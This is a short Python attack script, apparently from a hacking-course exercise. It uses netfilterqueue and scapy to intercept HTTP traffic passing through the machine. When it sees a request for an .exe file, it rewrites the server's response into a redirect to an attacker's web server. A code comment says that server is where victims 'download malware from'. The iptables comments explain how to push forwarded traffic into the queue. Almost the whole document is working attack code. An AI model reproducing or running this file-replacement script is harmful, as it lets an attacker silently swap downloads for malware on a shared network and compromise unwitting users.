#!/usr/bin/env python3

# iptables -I FORWARD -j NFQUEUE --queue-num 0 <- **run command to create queue which we will bind to**
# If testing locally, -I INPUT, OUTPUT in two separate commands
# iptables --flush <- **Run this when you are done, or it will continue using the queue,and you don't want that**

import netfilterqueue
import scapy.all as scapy

def set_packet(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    packet.set_payload(bytes(packet))
    return packet

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTTP packet being sent...")
                if ".exe" in scapy_packet[scapy.Raw].load.decode():
                    print("[+] exe request found...")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] HTTP packet being received...")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file...")
                    modified_packet = set_packet(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/test.exe\n\n") #location in your webserver where you want to download malware from
                    packet.set_payload(bytes(modified_packet))

    packet.accept()

queue= netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()